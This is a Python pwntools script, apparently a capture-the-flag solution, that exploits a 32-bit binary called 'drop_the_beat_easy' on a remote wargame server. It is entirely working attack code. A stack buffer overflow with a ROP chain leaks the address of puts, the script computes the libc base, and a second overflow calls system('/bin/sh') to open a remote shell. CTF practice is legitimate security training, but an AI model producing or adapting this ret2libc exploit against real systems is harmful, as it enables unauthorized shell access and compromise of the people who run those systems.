
from pwn import *
from leak_to_address import *

context.terminal = ['gnome-terminal', '-e']

# r = process('./drop_the_beat_easy')

r = remote('prob.vulnerable.kr', 20002)
elf = ELF('./drop_the_beat_easy')
libc = ELF('./libc.so.6')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# gdb.attach(r, gdbscript='c\n')

pop_ebx = 0x080483b9  # pop ebx; ret;
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
start = 0x0804853B

puts_off = libc.sym['puts']

r.recvuntil('..!\n')
r.sendline('1')
r.recvuntil('Beat!!\n')
p = 'A' * 104
p += p32(puts_plt)
p += p32(pop_ebx)
p += p32(puts_got)
p += p32(start)

r.sendline(p)
r.recvuntil('AWESOME!\n')
leak = r.readline()
s = Leak_address(leak, 32)
# print(s.print_leak())
LIBC_BASE = s.leak_to_32_int(0) - puts_off
ADDR_BINSH = libc.search('/bin/sh').next() + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

print
log.info('puts address:      ' + hex(s.leak_to_32_int(0)))
log.info('Libc base address: ' + hex(LIBC_BASE))
log.info('System address:    ' + hex(ADDR_SYSTEM))
log.info('`/bin/sh` address: ' + hex(ADDR_BINSH))
print

r.recvuntil('..!\n')
r.sendline('1')
r.recvuntil('Beat!!\n')
p = 'A' * 104
p += p32(ADDR_SYSTEM)
p += p32(0xAAAAAAAA)
p += p32(ADDR_BINSH)
r.sendline(p)

r.interactive()
